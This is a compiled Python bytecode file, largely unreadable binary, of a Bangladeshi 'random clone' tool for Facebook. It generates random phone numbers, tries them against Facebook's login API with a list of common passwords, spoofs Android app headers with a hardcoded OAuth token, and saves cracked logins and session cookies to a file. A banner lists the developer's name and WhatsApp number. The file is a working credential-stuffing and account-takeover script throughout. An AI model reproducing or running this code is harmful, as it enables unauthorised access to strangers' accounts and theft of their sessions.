�
    7�d><  �                   ��  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ 	 d dlZd dlmZ d dlZd dlmZ n{# e$ rs  ej        d	�  �          ej        d
�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �         Y nw xY wdZdZ ej        �   �         Ze�                     d�  �        Z! ej        �   �         Z"e"j#        Z$e"j%        Z&e"j'        Z( ej)        �   �         Z)d a*g a+g a,g Z- ej.        �   �         Z/g Z0g Z1d� Z2 ej3        g d��  �        Z4 ej3        g d��  �        Z5 ej3        g d��  �        Z6 ej3        ddg�  �        Z7 ej8        dd�  �        � d ej8        dd�  �        � d ej8        dd�  �        � �Z9 e: ej8        dd �  �        �  �        Z; ej3        g d!��  �        Z< ej3        g d"��  �        Z= ej3        g d#��  �        Z> ej3        g d$��  �        Z? ej3        g d%��  �        Z@d&� ZAd'ZBd(� ZCd)� ZDd*� ZEd+� ZF eD�   �          dS ),�    N)�BeautifulSoup)�date)�datetime)�sleep)�system)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzgit pullzrm -rf SGBDzpip install bs4zpip install httpxzpip install requestszpip unistall requestsz[1;91mz[1;32mz%H:%Mc                  �  � t          t          dd�  �        �  �        } g d�}g d�}g d�}g d�}g d�}g d�}||||||d	�}t          j        | �  �        }t          j        t          |�                    �   �         �  �        �  �        }	t          j        ||	         �  �        }
t          j        d
d�  �        � dt          j        d
d�  �        � t          j        d
d�  �        � �}t          j        dd�  �        � dt          j        dd�  �        � �}t          j        dd�  �        � dt          j        dd�  �        � dt          j        dd�  �        � dt          j        dd�  �        � �}t          t          j        dd�  �        �  �        }t          j        d�  �        }d|� d|	� d|
� d|� d|� d|� d|
� d|	� d|� d|� d�}|S ) N�   �   )z	Galaxy S6z	Galaxy S7z	Galaxy S8z	Galaxy S9z
Galaxy S10zGalaxy Note 5zGalaxy Note 8zGalaxy Note 9z	Galaxy A5z	Galaxy A7z	Galaxy J5z	Galaxy J7)�P10�P20�P30zMate 10zMate 20�Y7�Y9zNova 3i)
zRedmi Note 5zRedmi Note 6zRedmi Note 7zRedmi Note 8zRedmi Note 9zMi A1zMi A2zMi 8zMi 9zPoco F1)
�F7�F9�A3s�A5s�A7�A9�R11�R17zReno 2zReno 3)
�Y55�Y71�Y81�Y91�Y93�Y95�V9�V11�V15�S1)�C1�C2z3 Proz5 Pro�X�X2)�samsung�huawei�xiaomi�oppo�vivo�realme�	   �c   �.0.0.�� �?B �.�o   ��  i ����ɚ;)zcom.facebook.adsmanagerzcom.facebook.lite�com.facebook.orca�com.facebook.katana� Dalvik/2.1.0 (Linux; U; Android �; � z Build/SKQ1.z) [FBAN/EMA;FBLC/en_US;FBAV/z;FBBV/z;FBDV/z;FBMD/z;FBSN/z;FBPN/�])�list�range�random�choice�keys�randint�str)�android_versions�samsung_models�huawei_models�xiaomi_models�oppo_models�vivo_models�realme_models�android_models�and_vers�brand�and_mod�and_id�app_uld�app_ver�app_vercode�pkg_name�uas                    �temp.py�uaarV   +   s|  � ��E�!�R�L�L�)�)�� �  �  �N�V�V�V�M� R�  R�  R�M�Z�Z�Z�K�V�V�V�K�=�=�=�M�!������� �N� �}�-�.�.�H��M�$�~�2�2�4�4�5�5�6�6�E��m�N�5�1�2�2�G���q��$�$�W�W�6�>�!�B�+?�+?�W���PQ�RT�AU�AU�W�W�F�����/�/�K�K�&�.��S�2I�2I�K�K�G����3�'�'�t�t�&�.��C�*@�*@�t�t�6�>�RT�UX�CY�CY�t�t�\b�\j�km�nq�\r�\r�t�t�G��f�n�Y�y�9�9�:�:�K��}�v�w�w�H� 
R�H�  
R�  
R��  
R�  
R��  
R�  
R�U\�  
R�  
R�  {B�  
R�  
R�  JU�  
R�  
R�  ]d�  
R�  
R�  lq�  
R�  
R�  y�  
R�  
R�  GO�  
R�  
R�  
R�B��I�    (}  zGT-1015zGT-1020zGT-1030zGT-1035zGT-1040zGT-1045zGT-1050zGT-1240zGT-1440zGT-1450zGT-18190zGT-18262z	GT-19060IzGT-19082zGT-19083zGT-19105zGT-19152zGT-19192zGT-19300zGT-19505zGT-2000zGT-20000zGT-200szGT-3000z	GT-414XOPzGT-6918zGT-7010zGT-7020zGT-7030zGT-7040zGT-7050zGT-7100zGT-7105zGT-7110zGT-7205zGT-7210zGT-7240RzGT-7245zGT-7303zGT-7310zGT-7320zGT-7325zGT-7326zGT-7340zGT-7405zGT-7550   5GT-8005zGT-8010zGT-81zGT-810zGT-8105zGT-8110zGT-8220SzGT-8410zGT-9300zGT-9320zGT-93GzGT-A7100zGT-A9500z
GT-ANDROIDzGT-B2710zGT-B5330z	GT-B5330Bz	GT-B5330LzGT-B5330ZKAINUzGT-B5510zGT-B5512zGT-B5722zGT-B7510zGT-B7722zGT-B7810zGT-B9150zGT-B9388zGT-C3010zGT-C3262z	GT-C3310RzGT-C3312z	GT-C3312Rz	GT-C3313TzGT-C3322z	GT-C3322izGT-C3520z	GT-C3520IzGT-C3592zGT-C3595zGT-C3782zGT-C6712z	GT-E1282TzGT-E1500zGT-E2200zGT-E2202zGT-E2250zGT-E2252zGT-E2600z	GT-E2652WzGT-E3210zGT-E3309z	GT-E3309Iz	GT-E3309TzGT-G530HzGT-g900fzGT-G930FzGT-H9500zGT-I5508zGT-I5801zGT-I6410zGT-I8150zGT-I8160OKLTPAzGT-I8160ZWLTTTzGT-I8258z	GT-I8262DzGT-I8268zGT-I8505zGT-I8530BAABTUzGT-I8530BALCHOzGT-I8530BALTTTz	GT-I8550EzGT-i8700zGT-I8750zGT-I900z	GT-I9008LzGT-i9040z	GT-I9080Ez	GT-I9082CzGT-I9082EWAINUz	GT-I9082iz	GT-I9100GzGT-I9100LKLCHTz	GT-I9100Mz	GT-I9100Pz	GT-I9100TzGT-I9105UANDBTz	GT-I9128Ez	GT-I9128Iz	GT-I9128Vz	GT-I9158Pz	GT-I9158Vz	GT-I9168Iz	GT-I9192Iz	GT-I9195Hz	GT-I9195LzGT-I9250z	GT-I9303Iz	GT-I9305Nz	GT-I9308Iz	GT-I9505Gz	GT-I9505Xz	GT-I9507VzGT-I9600zGT-m190zGT-M5650zGT-miniz	GT-N5000S�GT-N5100zGT-N5105zGT-N5110zGT-N5120z	GT-N7000BzGT-N7005z	GT-N7100TzGT-N7102zGT-N7105z	GT-N7105TzGT-N7108z	GT-N7108D�GT-N8000zGT-N8005zGT-N8010zGT-N8020zGT-N9000zGT-N9505zGT-P1000CWAXSAz	GT-P1000Mz	GT-P1000TzGT-P1010z	GT-P3100BzGT-P3105zGT-P3108�GT-P3110�GT-P5100�GT-P5200zGT-P5210XD1�GT-P5220zGT-P6200z	GT-P6200LzGT-P6201zGT-P6210zGT-P6211zGT-P6800zGT-P7100zGT-P7300z	GT-P7300BzGT-P7310zGT-P7320z	GT-P7500Dz	GT-P7500Mz	GT-P7500Rz	GT-P7500VzGT-P7501zGT-P7511zGT-S3330zGT-S3332zGT-S3333zGT-S3370zGT-S3518zGT-S3570z	GT-S3600izGT-S3650z	GT-S3653Wz	GT-S3770Kz	GT-S3770Mz	GT-S3800WzGT-S3802zGT-S3850zGT-S5220z	GT-S5220RzGT-S5222zGT-S5230z	GT-S5230Wz	GT-S5233Tz	GT-s5233wzGT-S5250zGT-S5253zGT-s5260zGT-S5280zGT-S5282z	GT-S5283BzGT-S5292zGT-S5300z	GT-S5300LzGT-S5301z	GT-S5301Bz	GT-S5301LzGT-S5302z	GT-S5302BzGT-S5303z	GT-S5303BzGT-S5310z	GT-S5310Bz	GT-S5310Cz	GT-S5310Ez	GT-S5310Gz	GT-S5310Iz	GT-S5310Lz	GT-S5310Mz	GT-S5310NzGT-S5312z	GT-S5312Bz	GT-S5312Cz	GT-S5312LzGT-S5330zGT-S5360z	GT-S5360Bz	GT-S5360Lz	GT-S5360TzGT-S5363zGT-S5367zGT-S5369zGT-S5380z	GT-S5380DzGT-S5500zGT-S5560z	GT-S5560iz	GT-S5570Bz	GT-S5570Iz	GT-S5570LzGT-S5578zGT-S5600zGT-S5603zGT-S5610z	GT-S5610KzGT-S5611zGT-S5620zGT-S5670z	GT-S5670BzGT-S5670HKBZTAzGT-S5690z	GT-S5690RzGT-S5830z	GT-S5830Dz	GT-S5830Gz	GT-S5830iz	GT-S5830Lz	GT-S5830Mz	GT-S5830Tz	GT-S5830Vz	GT-S5831izGT-S5838z	GT-S5839izGT-S6010zGT-S6010BBABTUzGT-S6012z	GT-S6012BzGT-S6102z	GT-S6102Bz	GT-S6293Tz	GT-S6310BzGT-S6310ZWAMIDzGT-S6312z	GT-S6313TzGT-S6352zGT-S6500z	GT-S6500Dz	GT-S6500LzGT-S6790z	GT-S6790Lz	GT-S6790Nz	GT-S6792LzGT-S6800zGT-S6800HKAXFAzGT-S6802zGT-S6810z	GT-S6810Bz	GT-S6810Ez	GT-S6810Lz	GT-S6810MzGT-S6810MBASERz	GT-S6810PzGT-S6812z	GT-S6812Bz	GT-S6812Cz	GT-S6812izGT-S6818z	GT-S6818Vz	GT-S7230Ez	GT-S7233Ez	GT-S7250DzGT-S7262zGT-S7270z	GT-S7270LzGT-S7272z	GT-S7272Cz	GT-S7273TzGT-S7278z	GT-S7278U�GT-S7390z	GT-S7390Gz	GT-S7390LzGT-S7392z	GT-S7392LzGT-S7500zGT-S7500ABABTUzGT-S7500ABADBTzGT-S7500ABTTLPzGT-S7500CWADBTz	GT-S7500Lz	GT-S7500TzGT-S7560z	GT-S7560MzGT-S7562z	GT-S7562Cz	GT-S7562iz	GT-S7562LzGT-S7566zGT-S7568z	GT-S7568IzGT-S7572z	GT-S7580Ez	GT-S7583TzGT-S758XzGT-S7592zGT-S7710z	GT-S7710LzGT-S7898z	GT-S7898IzGT-S8500zGT-S8530zGT-S8600z	GT-STB919zGT-T140zGT-T150zGT-V8azGT-V8izGT-VC818z	GT-VM919SzGT-W131zGT-W153zGT-X831zGT-X853zGT-X870zGT-X890zGT-Y8750)�zGT-I9190�KOT49HzGT-I9192r_   z	GT-I9300I�KTU84P�GT-I9300�IMM76Dra   �JSS15J�	GT-I9301I�KOT4rd   r_   �GT-I9500�JDQ39rf   �LRX22CrX   �JZO54KzGT-N7100r_   rY   ri   rY   r_   rZ   ri   r[   �IML74Kr[   �JDQr[   rg   r[   ri   zGT-P5110rg   r\   r_   zGT-P5210r_   r]   rg   r^   ri   �SAMSUNG�SM-A500Frl   zSM-G532Frl   �SM-G920Frl   �SM-G935Frl   �SM-J320Frl   �	SM-J510FNrl   zSM-N920Srl   zSM-T280z	SM-A500FU�MMB29Mrm   �LRX22Grm   rr   zSM-A500Hrr   zSM-G900Fr_   rn   �MMB29Krn   �NRD90MzSM-G930Fru   ro   rt   ro   ru   zSM-G950Fru   z	SM-J320FN�LMY47Vrp   �LMY4rp   rv   zSM-J320Hrv   �SM-J320Mrv   rq   rr   rq   �NMF2rq   �NMF26Xrq   zNMF26X;zSM-J701FzNRD90M;zSM-T111rg   zSM-T230r_   zSM-T231r_   zSM-T235zKOT4SM-T310r_   �SM-T311re   r{   r_   zSM-T315rg   zSM-T525r_   �SM-T531r_   r|   rs   zSM-T535rs   zSM-T555rs   zSM-T561r`   �SM-T705rs   r}   rs   zSM-T805rs   zSM*T820ru   zSPH-L720r_   )�grameenphone�Robi�Axiata�airtelzT-Mobile�YOTAr8   r7   r4   r5   r0   �   r/   r3   i�k�r6   )�GM1917�GM1913�GM1911�GM1910�GM1915)
�CPH1701�CPH1719�CPH2235�CPH1912�CPH1821�CPH1607�CPH1925�CPH2123�CPH2333�CPH2251)zSM-J320YzSM-J100FzSM-J100MzSM-J100HzSM-J200FzSM-J200Yrx   )�1718�1606�1807�1730�1725�1808�1714�2001A�1719�2002�1923A�1930)�001�002�003�004�005�006�007�008�009�010�011�012�013�014�015�016�017�018�019�020c                  ��  � dt          t          j        dd�  �        �  �        z   dz   t          t          �  �        z   dz   } dt          t          j        dd�  �        �  �        z   d	z   t          t
          �  �        z   d
z   t          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   dz   t          | �  �        z   dz   }|S )Nz[FBAN/FB4A;FBAV/r4   r5   zj.0.0.46.116;FBBV/351451241;FBLC/en_US;FBCR/China Unicom;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/zS;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1464};]r9   �   �   r:   z Build/QP1A.r1   r2   r3   z) � )rC   r?   rB   �hi�	randrange�model)�ENDrT   s     rU   �tanimr�   Q   s`  � � ��V�^�C��%<�%<�!=�!=�=�  ?k�  k�  lo�  pr�  ls�  ls�  s�  tI�  I��/��F�4D�Q�r�4J�4J�0K�0K�K�D�P�QT�UZ�Q[�Q[�[�\j�j�kn�ou�o�  AG�  HN�  pO�  pO�  lP�  lP�  P�  QT�  T�  UX�  Y_�  Yi�  jm�  nq�  Yr�  Yr�  Us�  Us�  s�  tx�  x�  y|�  }@�  yA�  yA�  A�  BD�  D���	rW   u�          
        [38;5;83m __..__..  .._..__
        [38;5;84m(__ [__]|\/| | [__)
        [38;5;85m.__)|  ||  |_|_|  \  [38;5;197m(V2)
[38;5;77m──────────────────────────────────────────────                 
[38;5;78m〘✧〙DEVLOPER  [38;5;222m➤  [38;5;78m SADMAN SAMIR SNIGDHO
[38;5;79m〘✧〙FACEBOOK  [38;5;222m➤  [38;5;79m SNIGDHO AFRIDI
[38;5;115m〘✧〙WHATSAPP  [38;5;222m➤   [38;5;115m+8801871778635
[38;5;78m〘✧〙TOOLS     [38;5;222m➤   [38;5;78mRANDOM CLONE    [38;5;197m(FREE)
[38;5;77m──────────────────────────────────────────────c                  �$   � t          d�  �         d S )Nu�   [38;5;194m──────────────────────────────────────────────)�print� rW   rU   �linexr�   _   s)   � ��  c�  d�  d�  d�  d�  drW   c                  �T  � t          j        d�  �         t          t          �  �         t          d�  �         t          d�  �         t	          �   �          t          d�  �        } | dv rt          �   �          | dv rt          j        d�  �         | dv rt          j        d�  �         d S d S )	N�clearu#   [38;5;155m➤  [1] RANDOM CRACK BDu   [38;5;155m➤  [2] EXIT TOOLS �   [38;5;155m[➤] YOUR CHOICE : )�1�01)�2�02�exit)�E�e)�osr   r�   �logor�   �input�bhoot)�ts    rU   �mainr�   a   s�   � ��I�g����u�T�{�{�{�	�
3�4�4�4�	�
/�0�0�0������0�1�1�A��J��������J���
�	�&�����I�~�~�
�	�&������ �~rW   c                  �j  � g } g }t           j         t           j         t          j        d�  �         t	          t
          �  �         t	          d�  �         t          d�  �        }t          �   �          t          j        d�  �         t	          t
          �  �         t	          d�  �         t          t          d�  �        �  �        }t          �   �          t          j        d�  �         t	          t
          �  �         t          |�  �        D ]C}d�
                    d� t          d�  �        D �   �         �  �        }| �                    |�  �         �Dt          d�	�  �        5 }t          t          | �  �        �  �        }t	          d
�  �         t          �   �          | D ]P}|dd �         |||z   ||d d�         z   ddddddddddddddddg}	||z   }
|�                    t           |
|	|�  �         �Q	 d d d �  �         n# 1 swxY w Y   t	          dt          t          t"          �  �        �  �        z   �  �         d S )Nr�   u,   [38;5;155m[✧] SIM CODE : 017,016,018,019 r�   u2   [38;5;155m[✧] LIMIT EXAMPLE : 5000,10000,50000 r�   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)r?   r@   �string�digits)�.0�_s     rU   �	<genexpr>zbhoot.<locals>.<genexpr>~   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�ErW   �   �   )�max_workersuP   [38;5;155m[➤] [38;5;222mUSE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDS <>~~~�   �   �
bangladeshz	free firez
i love you�sadiya�mimmim�mababa�sarmin�riya123�yousha�sabbir�mehedi�tonmoy�ayesha�fuckyou�tammana�nishatzTOTAL OK [1;92m)r�   �getuid�geteuidr   r�   r�   r�   r�   �intr>   �join�append�
ThreadPoolrC   �len�submit�api�oks)�user�twf�code�limit�nmbr�nmp�TANIM�tl�love�pwx�idss              rU   r�   r�   n   s{  � �	�D�	�C��I�I��J�J��I�g����	�$�K�K�K�	�
<�=�=�=��6�7�7�D������I�g����	�$�K�K�K�	�
B�C�C�C���:�;�;�<�<�E�U�W�W�W��I�g����	�$�K�K�K��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C�����	��	#�	#�	#� )�u���T���^�^���f�g�g�g�hm�ho�ho�ho�� 	)� 	)�D�����8�D��d��4��R�a�R��=��k�R^�_g�hp�qy�  {C�  DM�  NV�  W_�  `h�  iq�  rz�  {D�  EN�  OW�  X�C��t�)�C��L�L��S��R�(�(�(�(�	)�)� )� )� )� )� )� )� )� )� )� )���� )� )� )� )� 
�
��C��H�H���
-�.�.�.�.�.s   �BG7�7G;�>G;c                 �   � t           j        �                    dt          � dt          � t          t          �  �        � d��  �         t           j        �                    �   �          	 |D �]t}t          t          j
        �   �         �  �        }t          �   �         }i dt          t          j
        �   �         �  �        �dd�dt          t          j
        �   �         �  �        �d| �d	|�d
d�dd�dd�dd�dt          t          j
        �   �         �  �        �dd	�dd�dd�dd�dd�dd�dd�dddd ��}t          �   �         d!d"d#d$dt          t          j        d%d&�  �        �  �        t          t          j        d%d&�  �        �  �        t          t          j        d%d&�  �        �  �        d'd(d)d*�}t          j        d+||d,�-�  �        �                    �   �         }d.|v �r|d/         }	i }
|	D ]%}|
�                    |d0         |d1         i�  �         �&d2�                    d3� |
�                    �   �         D �   �         �  �        }	t+          j        d4|	�  �        d5         } t/          d6| z   d7z   |z   d8z   �  �         t/          d9|	z   d:z   �  �         t1          �   �          t          �                    | �  �         t5          d;d<�  �        �                    | d=z   |z   d>z   �  �          n��vt          d?z  ad S # t6          $ r}Y d }~d S d }~ww xY w)@Nu-   [38;5;155m[➤] SAMIR~FINDING  [38;5;155m[z]  [38;5;155mOK :- r;   �adid�format�json�	device_id�email�password�generate_analytics_claimsr�   �community_idr�   �cpl�true�try_num�family_device_id�credentials_type�source�login�error_detail_type�button_with_disabled�enroll_misauth�false�generate_session_cookies�generate_machine_id�currently_logged_in_userid�0�en_GB�GB�authenticate)�locale�client_country_code�fb_api_req_friendly_namezgzip, deflatez*/*z
keep-alivez3OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32i N  i@�  �unknownz!application/x-www-form-urlencoded�Liger)z
User-AgentzAccept-Encoding�Accept�
Connection�AuthorizationzX-FB-Friendly-NamezX-FB-Connection-BandwidthzX-FB-Net-HNIzX-FB-SIM-HNIzX-FB-Connection-TypezContent-TypezX-FB-HTTP-Enginez'https://b-graph.facebook.com/auth/loginF)�data�headers�allow_redirects�access_token�session_cookies�name�value�;c                 �"   � g | ]\  }}|�d |����S )�=r�   )r�   �keyr(  s      rU   �
<listcomp>zapi.<locals>.<listcomp>�   s'   � �"Z�"Z�"Z�z�s�E�s�s�s�E�E�$:�"Z�"Z�"ZrW   zc_user=(.*);xsr   z[38;5;84m[SAMIR-LIVE] z ~~ z[38;5;155mu   [1;92m[COOKIE] : ➤ : z[38;5;223mz/sdcard/SAMIR-OKS.txt�az | �
�   )�sys�stdout�write�loop�GREENr�   r�   �flushrC   �uuid�uuid4rV   r�   r?   rB   �requests�postr  �updater�   �items�re�findallr�   r�   r�   �open�	Exception)r�   �pwvr�   �pasr   �	ua_stringr"  �head�po�kuki�cok�xr�   s                rU   r�   r�   �   s�  � ��J���{�D�{�{�in�{�ps�tw�px�px�{�{�{�|�|�|�  ~A�  ~H�  ~N�  ~N�  ~P�  ~P�  ~P�4�� 0	� 0	�C��t�z�|�|�$�$�D����I�@�&�#�d�j�l�l�+�+� @��f�@���T�Z�\�\�!2�!2�@� �S�@� ��	@�
 0��@� #�B�@� �6�@� �s�@� '��D�J�L�L�(9�(9�@� '�
�@� �g�@� (�)?�@� %�g�@� /��@� *�3�@�  1�#�!@�" &�+/�0>�'@� @� @�D�( !&���(7�#�".�%Z�*8�14�V�^�E�5�5Q�5Q�1R�1R�$'���u�e�(D�(D�$E�$E�$'���u�e�(D�(D�$E�$E�,5�$G�(/�1� 1�D� ��T�Z^�gk�  }B�  C�  C�  C�  H�  H�  J�  J�B���#�#��+�,����� 7� 7�A��J�J��&�	�!�G�*�5�6�6�6�6��z�z�"Z�"Z�S�Y�Y�[�[�"Z�"Z�"Z�[�[���j�!1�4�8�8��;���5�c�9�&�@��D�EU�U�V�V�V��3�D�8�9I�I�J�J�J�5�7�7�7��
�
�3�����,�S�1�1�7�7��E�	�#��d�8J�K�K�K�����a������� � � ��������������s   �$JK( �(
K=�8K=)G�marshalr�   r1  �timer  r?   r=  r�   �platform�base64r7  �bs4r   �sopr9  �ressr   r   r   r   �s�waktu�concurrent.futuresr   r�   �	mechanize�requests.exceptionsr	   �ModuleNotFoundError�REDr5  �now�strftime�	dt_string�current�year�ta�month�bu�day�ha�todayr4  r�   �cps�cokbrut�Session�ses�uat�ugenrV   r@   r�   �gtt�sim�fbrB   �fbavrC   �fbbv�oner�   �lolr,   r�   r�   r�   r�   r�   r�   r�   r�   rW   rU   �<module>ro     sb  �� ���� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �'��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� '� '� '��B�I�I�J�J�J��B�I�j�����B�I�m�����B�I�� � � ��B�I�!�"�"�"��B�I�$�%�%�%��B�I�%�&�&�&�&�&�'���� �����h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
����������
���H�������	��� � �6 	���  HE�  HE�  HE�  	IE�  	IE���F�M�  M�  M�  M�  N�  N���f�m�O�O�O�P�P���V�]�)�*=�>�?�?��
�&�.��S�
!�
!�Y�Y����r�"�(=�(=�Y�Y����s�SV�@W�@W�Y�Y��
�s�>�6�>�)�I�.�.�/�/���f�m�B�B�B�C�C���V�]�x�x�x�y�y���f�m�b�b�b�c�c���v�}�l�l�l�m�m���v�}�  O�  O�  O�  P�  P��� � �	[��d� d� d�
� 
� 
�/� /� /�67� 7� 7�p ������s   �A1 �1A5C)�(C)